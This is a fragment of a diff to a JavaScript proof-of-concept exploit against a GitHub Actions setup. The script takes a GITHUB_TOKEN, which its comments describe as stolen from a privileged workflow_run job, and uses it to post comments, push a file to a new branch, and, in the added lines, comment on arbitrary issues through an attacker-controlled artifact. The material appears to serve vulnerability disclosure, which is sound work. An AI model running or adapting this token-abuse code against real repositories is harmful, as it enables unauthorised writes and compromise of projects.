@@ -183,6 +183,10 @@ function api(method, path, body) {
     body: 'RCE proof: comment posted by the GITHUB_TOKEN stolen from the privileged workflow_run job (run ' + runId + '). Marker RCE-PROOF-' + runId
   });
   console.log('API comment (pull-requests:write) => ' + cm.status + ' perms=' + cm.perm + ' ' + cm.body.slice(0, 160));
+  const cross = await api('POST', '/repos/' + repo + '/issues/1/comments', {
+    body: 'Cross-PR injection proof: the coverage bot can comment on any PR/issue because number comes from the attacker artifact (RCE-PROOF-' + runId + ')'
+  });
+  console.log('API cross-PR comment on #1 (pull-requests:write) => ' + cross.status + ' ' + cross.body.slice(0, 160));
   const putc = await api('PUT', '/repos/' + repo + '/contents/rce-proof-' + runId + '.txt', {
     message: 'rce proof ' + runId, content: Buffer.from('rce-proof ' + runId + '\n').toString('base64'), branch: 'rce-proof-' + runId
   });
